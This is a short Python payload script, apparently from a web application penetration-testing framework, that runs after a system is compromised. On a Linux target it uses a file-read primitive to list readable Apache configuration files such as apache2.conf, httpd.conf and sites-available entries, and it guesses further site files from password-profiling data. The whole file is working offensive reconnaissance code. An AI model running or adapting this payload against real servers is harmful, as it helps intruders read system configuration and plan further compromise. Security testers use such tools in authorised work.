#REQUIRE_LINUX
#This payload finds readable Apache configuration files
#from plugins.attack.payloads.misc.file_crawler import get_files
import core.data.kb.knowledgeBase as kb
import re

result = []
files = []

files.append('apache2.conf')
files.append('httpd.conf')
files.append('magic')
files.append('envvars')
files.append('ports.conf')
files.append('conf.d/security')
files.append('sites-available/default')
files.append('sites-available/default-ssl')

apache_dir = run_payload('apache_config_directory')
if apache_dir:
    for dir in apache_dir:
        for file in files:
            if read(dir+file) != '':
                result.append(dir+file)
                #result.append(get_files(read(dir+file)))
        if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
            for profile in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                result.append(dir+'sites-available/'+profile.lower())


result = list(set(result))
result = [p for p in result if p != '']

